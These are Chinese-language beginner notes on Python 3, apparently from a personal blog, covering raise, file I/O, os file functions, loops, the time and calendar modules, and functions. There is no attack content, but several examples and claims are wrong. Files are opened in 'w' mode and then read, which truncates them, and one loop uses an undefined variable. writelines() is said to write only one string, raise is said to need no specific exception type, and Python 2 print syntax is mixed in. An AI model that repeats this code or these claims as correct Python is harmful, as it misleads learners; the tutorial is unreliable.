<h2 id="raise抛出异常"><a href="#raise抛出异常" class="headerlink" title="raise抛出异常"></a>raise抛出异常</h2><p>如果我们想在自己写代码的过程中遇到问题也抛出异常，可以使用raise语句<br>例如：<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">def <span class="keyword">div</span>(<span class="keyword">a</span>,b):</span><br><span class="line">	<span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">      raise ZeroDivisionError</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   		<span class="literal">return</span> <span class="keyword">a</span>/b</span><br><span class="line">        </span><br><span class="line"><span class="keyword">div</span>(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">Traceback (most recent call <span class="keyword">last</span>):</span><br><span class="line">  File <span class="string">"D:/TIM_DOWLOAD/233.py"</span>, <span class="built_in">line</span> <span class="number">7</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">div</span>(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">  File <span class="string">"D:/TIM_DOWLOAD/233.py"</span>, <span class="built_in">line</span> <span class="number">3</span>, <span class="keyword">in</span> <span class="keyword">div</span></span><br><span class="line">    raise ZeroDivisionError</span><br><span class="line">ZeroDivisionError</span><br><span class="line"></span><br><span class="line">Process finished <span class="keyword">with</span> exit code <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>在日常开发中，我们需要将数据写入某个文件，或者将文件中的数据读取到，就需要使用文件操作</p>
<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><p>python中打开文件使用内置函数<code>open</code>打开该文件<br>例如：<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">"test.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">r的意思是只读，即<span class="built_in">read</span>的缩写</span><br></pre></td></tr></table></figure><br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">"test.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">w的意思是可编辑，即<span class="built_in">write</span>的缩写</span><br></pre></td></tr></table></figure></p>
<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>python中写文件的方法有<code>write()</code>和<code>writelines()</code></p>
<p>1.write():<br>使用该方法可以将字符串数据写入到文件中.<br>例如：<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">"stunames.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">f.<span class="built_in">write</span>(<span class="string">"Tome"</span>)</span><br><span class="line">f.<span class="built_in">write</span>(<span class="string">"David"</span>)</span><br><span class="line">f.<span class="built_in">write</span>(<span class="string">"Carl"</span>)</span><br></pre></td></tr></table></figure></p>
<p>2.writelines():<br>使用该方法只能将一个字符串写入到文件中<br>例如:<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">f=open(<span class="string">"stunames.txt"</span>,<span class="string">"w"</span>,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">f.writelines([<span class="string">"张三<span class="subst">\n</span>"</span>,<span class="string">"李四<span class="subst">\n</span>"</span>,<span class="string">"王五<span class="subst">\n</span>"</span>])</span><br></pre></td></tr></table></figure></p>
<p>3.close()<br>在使用完写文件操作后，需要使用close()方法将其关闭，避免占用空间导致资源浪费<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">"stunames.txt"</span>,<span class="string">"w"</span>,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">f.writelines([<span class="string">"张三\n"</span>,<span class="string">"李四\n"</span>,<span class="string">"王五\n"</span>])</span><br><span class="line">f.<span class="built_in">close</span>()<span class="comment">#关闭写操作</span></span><br></pre></td></tr></table></figure></p>
<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>python中的读文件方法有<code>read()</code>和<code>readlines()</code></p>
<p>1.read():<br><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="title">with</span> open(<span class="string">"stunames.txt"</span>,<span class="string">"w"</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="class"><span class="keyword">data</span>=f.read()</span></span><br><span class="line">    print(<span class="class"><span class="keyword">data</span>)</span></span><br><span class="line">    </span><br><span class="line">结果:</span><br><span class="line">张三</span><br><span class="line">李四</span><br><span class="line">王五</span><br></pre></td></tr></table></figure></p>
<p>2.readlines()<br>该方法可以将整个文件中的内容一次全读取出来，返回一个列表<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">open</span>(<span class="string">"stunames.txt"</span>,<span class="string">"w"</span>,<span class="keyword">encoding</span>=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">data</span>=f.readlines()</span><br><span class="line">    print(<span class="keyword">data</span>)</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">0</span>,<span class="keyword">len</span>(<span class="keyword">lines</span>)):</span><br><span class="line">    	print(<span class="string">"第&#123;&#125;行：&#123;&#125;"</span>.format(i,<span class="keyword">lines</span>[i]))</span><br><span class="line">        </span><br><span class="line">结果为：</span><br><span class="line">[<span class="string">'张三\n'</span>,<span class="string">'李四\n'</span>,<span class="string">'王五\n'</span>]</span><br><span class="line">第<span class="number">0</span>行：张三</span><br><span class="line"></span><br><span class="line">第<span class="number">1</span>行：李四</span><br><span class="line"></span><br><span class="line">第<span class="number">2</span>行：王五</span><br></pre></td></tr></table></figure></p>
<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><p>除了打开，读和写文件，还要有删除，重命名，创建文件夹等功能</p>
<p>1.rename(oldfile,newfile)函数<br>字面意思，就是重命名文件<br>例如：<br><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">import <span class="built_in">os</span></span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">rename</span>(<span class="string">"test.txt"</span>,<span class="string">"测试.txt"</span>)</span><br></pre></td></tr></table></figure><br>2.remove(path)函数<br>删除指定文件<br><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">import <span class="built_in">os</span></span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">remove</span>(<span class="string">"测试.txt"</span>)</span><br></pre></td></tr></table></figure></p>
<p>3.mkdir(path)函数<br>创建文件夹<br><figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">os</span></span><br><span class="line"><span class="built_in">os</span>.mkdir(<span class="string">"d://testdir"</span>)</span><br></pre></td></tr></table></figure></p>
<p>4.getcwd函数<br>获取程序的绝对路径<br><figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">os</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">os</span>.getcwd())</span><br></pre></td></tr></table></figure></p>
<p>5.listdir(path)函数<br>获取指定路径下的文件列表<br><figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">os</span></span><br><span class="line">lsdir=<span class="built_in">os</span>.listdir(<span class="string">"./"</span>)</span><br><span class="line"><span class="built_in">print</span>(lsidr)</span><br></pre></td></tr></table></figure><br>6.rmdir(path)函数<br>删除指定路径下的空文件夹<br><figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">os</span></span><br><span class="line"><span class="built_in">os</span>.rmdir(<span class="string">"./datas"</span>)</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.可以在文件头加上<code>if_name_==&quot;_main_&quot;:</code>来保证该模块的运行，不被其他模块调用</p>
<p>2.单继承时，子类只能继承父类的非私有成员变量和非私有成员函数</p>
<p>3.由于在开发过程中，无法完全确定会出现的异常，所以建议采用<code>except Exception as err_all</code>的方式</p>
<p>4.在使用raise抛出异常时，无需写明异常类型，只需要写Exception即可</p>
<p>5.在文件操作时，读文件操作时，如果是只读操作读取不存在的文件，则会报错，如果是只写操作读取不存在的文件，则会自动创建一个文件</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/3/1-基础2</title>
    <url>/2020/03/01/Python3-2020-3-1-%E5%91%A8%E6%8A%A51/</url>
    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><p>基本形式<br><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 判断条件：</span><br><span class="line">    执行语句</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    执行语句</span><br></pre></td></tr></table></figure><br>if语句可以用&gt;,&lt;,==，&gt;=,&lt;=来表示其关系</p>
<p>由于python没有switch语句，所以在遇到判断条件为多个值时，用下列形式：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 判断条件<span class="number">1</span>:</span><br><span class="line">	执行语句<span class="number">1</span></span><br><span class="line">elif 判断条件<span class="number">2</span>:</span><br><span class="line">	执行语句<span class="number">2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	执行语句<span class="number">3</span></span><br></pre></td></tr></table></figure><br>在python中，如果满足条件却不做任何操作，使用<code>pass</code>直接跳过</p>
<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><p>循环语句主要分为<code>for循环</code>和<code>while循环</code></p>
<p>这两者的区别时，当不知道循环次数时，使用后者，反之。</p>
<h2 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">break</span>语句  用于终止循环，跳出整个循环</span><br><span class="line"><span class="keyword">continue</span>语句 用于终止当前循环，执行下一次循环</span><br><span class="line">pass语句 保证结构的完整性</span><br></pre></td></tr></table></figure>
<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="built_in">count</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">count</span> &lt; <span class="number">9</span>):</span><br><span class="line">   <span class="built_in">print</span> '<span class="type">The</span> <span class="built_in">count</span> <span class="keyword">is</span>:', <span class="built_in">count</span></span><br><span class="line">   <span class="built_in">count</span> = <span class="built_in">count</span> + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Good bye!"</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line"><span class="type">The</span> <span class="built_in">count</span> <span class="keyword">is</span>: <span class="number">0</span></span><br><span class="line"><span class="type">The</span> <span class="built_in">count</span> <span class="keyword">is</span>: <span class="number">1</span></span><br><span class="line"><span class="type">The</span> <span class="built_in">count</span> <span class="keyword">is</span>: <span class="number">2</span></span><br><span class="line"><span class="type">The</span> <span class="built_in">count</span> <span class="keyword">is</span>: <span class="number">3</span></span><br><span class="line"><span class="type">The</span> <span class="built_in">count</span> <span class="keyword">is</span>: <span class="number">4</span></span><br><span class="line"><span class="type">The</span> <span class="built_in">count</span> <span class="keyword">is</span>: <span class="number">5</span></span><br><span class="line"><span class="type">The</span> <span class="built_in">count</span> <span class="keyword">is</span>: <span class="number">6</span></span><br><span class="line"><span class="type">The</span> <span class="built_in">count</span> <span class="keyword">is</span>: <span class="number">7</span></span><br><span class="line"><span class="type">The</span> <span class="built_in">count</span> <span class="keyword">is</span>: <span class="number">8</span></span><br><span class="line"><span class="type">Good</span> bye!</span><br></pre></td></tr></table></figure>
<h4 id="continue和break的用法"><a href="#continue和break的用法" class="headerlink" title="continue和break的用法"></a>continue和break的用法</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">10</span>:   </span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> &gt; <span class="number">0</span>:     # 非双数时跳过输出</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(i)         # 输出双数<span class="number">2</span>、<span class="number">4</span>、<span class="number">6</span>、<span class="number">8</span>、<span class="number">10</span></span><br><span class="line"> </span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:            # 循环条件为<span class="number">1</span>必定成立</span><br><span class="line">    print(i)         # 输出<span class="number">1</span>~<span class="number">10</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">10</span>:     # 当i大于<span class="number">10</span>时跳出循环</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h4 id="死循环"><a href="#死循环" class="headerlink" title="死循环"></a>死循环</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br></pre></td></tr></table></figure>
<h4 id="循环使用else语句"><a href="#循环使用else语句" class="headerlink" title="循环使用else语句"></a>循环使用else语句</h4><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">count</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">count</span> &lt; <span class="number">5</span>:</span><br><span class="line">   <span class="keyword">print</span>(<span class="keyword">count</span>, <span class="string">" is  less than 5"</span>)</span><br><span class="line">   <span class="keyword">count</span> = <span class="keyword">count</span> + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">print</span>(<span class="keyword">count</span>, <span class="string">" is not less than 5"</span>)</span><br></pre></td></tr></table></figure>
<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="symbol">'Python</span>':     # 第一个实例</span><br><span class="line">   print('当前字母 :', letter)</span><br><span class="line"> </span><br><span class="line">fruits = [<span class="symbol">'banana</span>', <span class="symbol">'apple</span>',  <span class="symbol">'mango</span>']</span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> fruits:        # 第二个实例</span><br><span class="line">   print('当前水果 :', fruit)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">"Good bye!"</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">当前字母 : <span class="type">P</span></span><br><span class="line">当前字母 : <span class="type">y</span></span><br><span class="line">当前字母 : <span class="type">t</span></span><br><span class="line">当前字母 : <span class="type">h</span></span><br><span class="line">当前字母 : <span class="type">o</span></span><br><span class="line">当前字母 : <span class="type">n</span></span><br><span class="line">当前水果 : <span class="type">banana</span></span><br><span class="line">当前水果 : <span class="type">apple</span></span><br><span class="line">当前水果 : <span class="type">mango</span></span><br><span class="line">Good bye!</span><br></pre></td></tr></table></figure>
<h4 id="通过序列索引迭代"><a href="#通过序列索引迭代" class="headerlink" title="通过序列索引迭代"></a>通过序列索引迭代</h4><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">fruits = [<span class="string">'banana'</span>, <span class="string">'apple'</span>,  <span class="string">'mango'</span>]</span><br><span class="line">for <span class="meta">index</span> <span class="meta">in</span><span class="meta"> range(</span>l<span class="meta">en(</span>fruits)):</span><br><span class="line">   p<span class="meta">rint(</span><span class="string">'当前水果 :'</span>, fruits[<span class="meta">index</span>])</span><br><span class="line"> </span><br><span class="line">p<span class="meta">rint(</span><span class="string">"Good bye!"</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">当前水果 : banana</span><br><span class="line">当前水果 : apple</span><br><span class="line">当前水果 : mango</span><br><span class="line">Good bye!</span><br></pre></td></tr></table></figure>
<h4 id="循环使用else语句-1"><a href="#循环使用else语句-1" class="headerlink" title="循环使用else语句"></a>循环使用else语句</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">20</span>):  # 迭代 <span class="number">10</span> 到 <span class="number">20</span> 之间的数字</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,num): # 根据因子迭代</span><br><span class="line">      <span class="keyword">if</span> num%i == <span class="number">0</span>:      # 确定第一个因子</span><br><span class="line">         j=num/i          # 计算第二个因子</span><br><span class="line">         print(<span class="string">'%d 等于 %d * %d'</span> % (num,i,j))</span><br><span class="line">         <span class="keyword">break</span>            # 跳出当前循环</span><br><span class="line">   <span class="keyword">else</span>:                  # 循环的 <span class="keyword">else</span> 部分</span><br><span class="line">      print(num, <span class="string">'是一个质数'</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line"><span class="number">10</span> 等于 <span class="number">2</span> * <span class="number">5</span></span><br><span class="line"><span class="number">11</span> 是一个质数</span><br><span class="line"><span class="number">12</span> 等于 <span class="number">2</span> * <span class="number">6</span></span><br><span class="line"><span class="number">13</span> 是一个质数</span><br><span class="line"><span class="number">14</span> 等于 <span class="number">2</span> * <span class="number">7</span></span><br><span class="line"><span class="number">15</span> 等于 <span class="number">3</span> * <span class="number">5</span></span><br><span class="line"><span class="number">16</span> 等于 <span class="number">2</span> * <span class="number">8</span></span><br><span class="line"><span class="number">17</span> 是一个质数</span><br><span class="line"><span class="number">18</span> 等于 <span class="number">2</span> * <span class="number">9</span></span><br><span class="line"><span class="number">19</span> 是一个质数</span><br></pre></td></tr></table></figure>
<h2 id="简单管理系统"><a href="#简单管理系统" class="headerlink" title="简单管理系统"></a>简单管理系统</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">all_workers=[]#存储所有员工信息的列表</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">        1.信息录入</span></span><br><span class="line"><span class="string">        2.信息浏览</span></span><br><span class="line"><span class="string">        3.信息查阅</span></span><br><span class="line"><span class="string">        4.信息删除</span></span><br><span class="line"><span class="string">        exit-退出</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span>)</span><br><span class="line">    <span class="attribute">choice</span>=input("请选择：")</span><br><span class="line">    <span class="keyword">if</span> <span class="attribute">choice</span>=='1':</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           <span class="attribute">id</span>=int(input("请输入工号："))</span><br><span class="line">           <span class="attribute">name</span>=input("请输入姓名：")</span><br><span class="line">           <span class="attribute">age</span>=int(input("请输入年龄："))</span><br><span class="line">           one_worker = [id, name, age]  # 定义一个列表</span><br><span class="line">           all_workers.append(one_worker)#附加--将当前的数据附加到最后</span><br><span class="line">           <span class="attribute">is_exit</span>=input("是否继续录入(yes/no)?")</span><br><span class="line">           <span class="keyword">if</span> <span class="attribute">is_exit</span>=='yes':</span><br><span class="line">                pass</span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">                break</span><br><span class="line">    elif <span class="attribute">choice</span>=='2':</span><br><span class="line">        <span class="keyword">for</span> one <span class="keyword">in</span> all_workers:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"工号：%d,姓名：%s,年龄：%d"</span>%(one[0],one[1],one[2]))</span><br><span class="line">    elif <span class="attribute">choice</span>=='3':</span><br><span class="line">        <span class="attribute">name</span>=input("请输入要查找员工的姓名")</span><br><span class="line">        <span class="keyword">for</span> two <span class="keyword">in</span> all_workers:</span><br><span class="line">            <span class="keyword">if</span> name == two[1]:</span><br><span class="line">                <span class="builtin-name">print</span>(<span class="string">"工号：%d,姓名：%s,年龄：%d"</span>%(two[0],two[1],two[2]))</span><br><span class="line">    elif <span class="attribute">choice</span>=='4':</span><br><span class="line">        <span class="attribute">id</span>=int(input("请输入想要删除的员工号："))</span><br><span class="line">        <span class="attribute">i</span>=0</span><br><span class="line">        <span class="keyword">for</span> three <span class="keyword">in</span> all_workers:</span><br><span class="line">            <span class="keyword">if</span> <span class="attribute">id</span>==three[0]:</span><br><span class="line">                del all_workers[i]</span><br><span class="line">            i+=1</span><br><span class="line">    <span class="keyword">if</span> <span class="attribute">choice</span>=='exit':</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<h1 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h1><p>python提供了很多方法处理日期和时间，转换日期格式是常见的功能</p>
<p>时间间隔是以秒为单位的浮点小数，每个时间戳都以1970年1月1日午夜经过了多少秒来表示</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">import <span class="built_in">time</span>;  <span class="comment"># 引入time模块</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">ticks</span> = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">print <span class="string">"当前时间戳为:"</span>, <span class="built_in">ticks</span></span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">当前时间戳为: <span class="number">1459994552.51</span></span><br></pre></td></tr></table></figure>
<h2 id="获取当前时间"><a href="#获取当前时间" class="headerlink" title="获取当前时间"></a>获取当前时间</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line"> </span><br><span class="line">localtime = time.localtime(time.time())</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"本地时间为 :"</span>, localtime</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">本地时间为 : time.struct_time(<span class="attribute">tm_year</span>=2020, <span class="attribute">tm_mon</span>=2, <span class="attribute">tm_mday</span>=28, <span class="attribute">tm_hour</span>=10, <span class="attribute">tm_min</span>=3, <span class="attribute">tm_sec</span>=27, <span class="attribute">tm_wday</span>=3, <span class="attribute">tm_yday</span>=98, <span class="attribute">tm_isdst</span>=0)</span><br></pre></td></tr></table></figure>
<h2 id="获取格式化的时间"><a href="#获取格式化的时间" class="headerlink" title="获取格式化的时间"></a>获取格式化的时间</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">localtime</span> = <span class="type">time</span>.asctime( <span class="type">time</span>.<span class="built_in">localtime</span>(<span class="type">time</span>.time()) )</span><br><span class="line">print "本地时间为 :", <span class="built_in">localtime</span></span><br><span class="line"></span><br><span class="line">结果为</span><br><span class="line">本地时间为 : Feb Apr  <span class="number">7</span> <span class="number">10</span>:<span class="number">05</span>:<span class="number">21</span> <span class="number">2020</span></span><br></pre></td></tr></table></figure>
<h2 id="获取某月日历"><a href="#获取某月日历" class="headerlink" title="获取某月日历"></a>获取某月日历</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> calendar</span><br><span class="line"> </span><br><span class="line">cal = calendar.month(<span class="number">2020</span>, <span class="number">2</span>)</span><br><span class="line">print(<span class="string">"以下输出2020年2月份的日历:"</span>)</span><br><span class="line">print(cal)</span><br><span class="line"></span><br><span class="line">结果为</span><br><span class="line">   February <span class="number">2020</span></span><br><span class="line">Mo Tu We Th Fr Sa Su</span><br><span class="line">                <span class="number">1</span>  <span class="number">2</span></span><br><span class="line"> <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span></span><br><span class="line"><span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line"><span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span></span><br><span class="line"><span class="number">24</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">29</span></span><br></pre></td></tr></table></figure>
<h2 id="Time常用函数"><a href="#Time常用函数" class="headerlink" title="Time常用函数"></a>Time常用函数</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">time</span>.clock()  返回秒数的当前CPU时间</span><br><span class="line"></span><br><span class="line"><span class="built_in">time</span>.<span class="built_in">time</span>()  返回当时时间戳</span><br><span class="line"></span><br><span class="line"><span class="built_in">time</span>.localtime([<span class="built_in">secs</span>])  接受时间戳并返回当地时间下的时间元组</span><br></pre></td></tr></table></figure>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><p>函数代码块以def关键字开头，后接标识符名称和（）</p>
<p>任何传入的参数和自变量，必须放到()中，在（）中可以定义参数</p>
<p>内容以冒号起始，并且缩进</p>
<p>return 表达式 结束函数，不带return相当于返回None</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">functionname</span><span class="params">( parameters )</span>:</span></span><br><span class="line">   <span class="string">"函数_文档字符串"</span></span><br><span class="line">   function_suite</span><br><span class="line">   <span class="keyword">return</span> [expression]</span><br><span class="line">   </span><br><span class="line">结果为：</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span><span class="params">( str )</span>:</span></span><br><span class="line">   <span class="string">"打印传入的字符串到标准显示设备上"</span></span><br><span class="line">   print(str)</span><br><span class="line">   <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
<h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>直接使用函数名称，加上参数即可<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span><span class="params">( str )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   print(str)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">printme(<span class="string">"我要调用用户自定义函数!"</span>)</span><br><span class="line">printme(<span class="string">"再次调用同一函数"</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">我要调用用户自定义函数!</span><br><span class="line">再次调用同一函数</span><br></pre></td></tr></table></figure></p>
<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>分为必备参数，关键字参数，默认参数，不定长参数</p>
<h3 id="必备参数"><a href="#必备参数" class="headerlink" title="必备参数"></a>必备参数</h3><p>必须以顺序传入函数，和调用时的数量必须和声明时一致<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span><span class="params">( str )</span></span><span class="symbol">:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   print(str)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printme函数</span></span><br><span class="line">printme()</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">Traceback (most recent call last)<span class="symbol">:</span></span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">11</span>, <span class="keyword">in</span> &lt;<span class="class"><span class="keyword">module</span>&gt;</span></span><br><span class="line">    printme()</span><br><span class="line"><span class="symbol">TypeError:</span> printme() takes exactly <span class="number">1</span> argument (<span class="number">0</span> given)</span><br></pre></td></tr></table></figure></p>
<h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line">def printinfo( name, age ):</span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="builtin-name">print</span>(<span class="string">"Name: "</span>, name)</span><br><span class="line">   <span class="builtin-name">print</span>(<span class="string">"Age "</span>, age)</span><br><span class="line">   return</span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( <span class="attribute">age</span>=50, <span class="attribute">name</span>=<span class="string">"miki"</span> )</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">Name:  miki</span><br><span class="line">Age  50</span><br></pre></td></tr></table></figure>
<h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><p>调用函数时，默认参数的值如果没有传入，则被认为是默认值</p>
